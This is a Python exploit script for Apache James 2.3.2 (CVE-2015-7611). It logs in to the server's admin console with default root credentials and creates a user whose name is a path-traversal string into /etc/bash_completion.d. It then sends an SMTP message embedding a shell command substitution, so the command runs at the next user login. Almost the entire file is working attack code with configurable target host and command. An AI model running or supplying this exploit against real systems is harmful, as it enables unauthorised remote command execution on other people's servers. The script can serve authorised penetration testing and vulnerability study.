"""An exploit for Apache James 2.3.2 that executes remote commands.

This script creates a new user and enqueues a payload to be executed the next
time a user logs in to the machine. The vulnerability is documented in
CVE-2015-7611.

For more details, see http://www.securityfocus.com/bid/76933 and
https://www.exploit-db.com/exploits/35513/.
"""

import gflags
import logging
import socket
import sys

gflags.DEFINE_integer('admin_port', 4555, 'The administration tool port.')
gflags.DEFINE_integer('smtp_port', 25, 'The SMTP server port.')
gflags.DEFINE_string('admin_password', 'root', 'The administrator password.')
gflags.DEFINE_string('admin_user', 'root', 'The administrator username.')
gflags.DEFINE_string('command', '', 'The command to be executed.')
gflags.DEFINE_string('exploit_password', 'exploit',
                     'The exploited user\'s password.')
gflags.DEFINE_string('exploit_user', '../../../../../../../../etc/bash_completion.d',
                     'The exploited user\'s username.')
gflags.DEFINE_string('host', '127.0.0.1', 'The Apache James server host.')
gflags.DEFINE_string('loglevel', 'INFO', 'The log level.')
gflags.DEFINE_string('sender_email', 'user@domain', 'The sender\'s email address.')

FLAGS = gflags.FLAGS

# The number of bytes to receive from the admin and SMTP servers after each
# command.
RECV_BUFSIZE = 1024


def CreateNewSmtpUser(connection, user, password):
    """Creates a new SMTP user via the administration server.

    Args:
      connection: An open socket to the administration server.
      user: The user's username.
      password: The user's password.
    """
    payload = ['adduser %s %s' % (user, password), 'quit']
    SendPayload(connection, payload)
    logging.info('Created new user %s/%s' % (user, password))


def ConnectToAdminServer(host, port, user, password):
    """Connects to the administration server.

    Args:
      host: The host address of the machine.
      port: The port number of the administration server.
      user: The administration server username.
      password: The administration server password.

    Returns:
      An open socket to the administration server.
    """
    payload = [user, password]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(RECV_BUFSIZE)
    SendPayload(s, payload)
    logging.info('Connected to the admin console as %s/%s.' % (user, password))
    return s


def ConnectToSmtpServer(host, port):
    """Connects to the SMTP server.

    Args:
      host: The host address of the machine.
      port: The port number of the administration server.

    Returns:
      An open socket to the SMTP server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.recv(RECV_BUFSIZE)
    logging.info('Connected to the SMTP server.')
    return s


def SendPayload(connection, payload):
    """Sends a payload over the socket.

    Args:
      connection: An open socket.
      payload: An array of strings to be sent over the socket.
    """
    for line in payload:
        connection.send('%s\n' % line)
        connection.recv(RECV_BUFSIZE)


def SendCommand(connection, sender, recipient, command):
    """Sends a command as a mail message to the recipient.

    Args:
      connection: An open connection to the SMTP server.
      sender: The sender's email address.
      recipient: The recipient's email address.
      command: The command to be executed.
    """
    msg = ('From: %s\n'
           '\n'
           '\''
           '\n'
           '$(%s)\r\n'
           '.' % (sender, command))
    payload = ['EHLO %s\r' % sender,
               'MAIL FROM: <\'%s>\r' % sender,
               'RCPT TO: <%s>\r' % recipient,
               'DATA\r',
               '%s\r' % msg,
               'QUIT\r']
    SendPayload(connection, payload)
    logging.info('Sent command %s' % command)


def Main(argv):
    try:
        argv = FLAGS(argv)
    except gflags.FlagsError, e:
        print '%s\nUsage: %s ARGS\n%s' % (e, sys.argv[0], FLAGS)
        sys.exit(-1)

    logging.basicConfig(level=FLAGS.loglevel)

    # Create a vulnerable user.
    connection = ConnectToAdminServer(
        FLAGS.host, FLAGS.admin_port, FLAGS.admin_user, FLAGS.admin_password)
    CreateNewSmtpUser(connection, FLAGS.exploit_user, FLAGS.exploit_password)
    connection.close()

    # Send a command to the server.
    connection = ConnectToSmtpServer(FLAGS.host, FLAGS.smtp_port)
    SendCommand(
        connection, FLAGS.sender_email, FLAGS.exploit_user, FLAGS.command)
    connection.close()


if __name__ == '__main__':
    Main(sys.argv)